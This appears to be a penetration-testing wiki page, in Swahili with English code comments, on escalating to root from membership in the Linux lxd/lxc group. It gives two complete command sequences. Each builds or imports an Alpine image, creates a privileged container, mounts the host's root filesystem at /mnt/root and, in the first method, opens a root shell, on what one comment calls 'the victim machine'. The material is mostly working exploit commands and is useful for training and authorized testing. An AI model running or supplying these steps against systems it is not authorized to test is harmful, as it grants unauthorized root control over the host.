# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Ikiwa unahusishwa na _**lxd**_ **au** _**lxc**_ **group**, unaweza kuwa root

## Kutumia bila mtandao

### Method 1

Unaweza kufunga katika mashine yako mjenzi wa distro hii: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(fuata maelekezo ya github):
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
Pakia faili **lxd.tar.xz** na **rootfs.squashfs**, ongeza picha kwenye repo na uunde kontena:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Ikiwa unakutana na kosa _**Kosa: Hakuna hifadhi ya kuhifadhi iliyopatikana. Tafadhali tengeneza hifadhi mpya ya kuhifadhi**_\
> Kimbia **`lxd init`** na **rudia** kipande cha amri kilichopita

Hatimaye unaweza kutekeleza kontena na kupata root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Njia ya 2

Jenga picha ya Alpine na uanze kutumia bendera `security.privileged=true`, ukilazimisha kontena kuingiliana kama root na mfumo wa faili wa mwenyeji.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
